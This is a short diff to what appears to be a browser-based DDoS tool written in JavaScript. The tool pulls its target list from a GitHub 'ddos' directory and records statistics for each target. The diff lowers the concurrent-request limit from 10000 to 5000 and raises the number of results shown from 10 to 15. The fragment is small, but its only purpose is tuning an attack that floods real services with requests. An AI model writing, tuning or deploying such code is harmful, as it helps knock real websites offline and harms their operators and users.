@@ -5,8 +5,8 @@ const NO_RESPONSE_SYMBOL = "☠️";
 const targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/';
 const updateInterval = 500;
 const fetchTimeout = 1000;
-const CONCURRENCY_LIMIT = 10000;
-const RESULTS_NUM = 10
+const CONCURRENCY_LIMIT = 5000;
+const RESULTS_NUM = 15
 
 var targetStats = {}
 var statsEl = document.getElementById('stats');
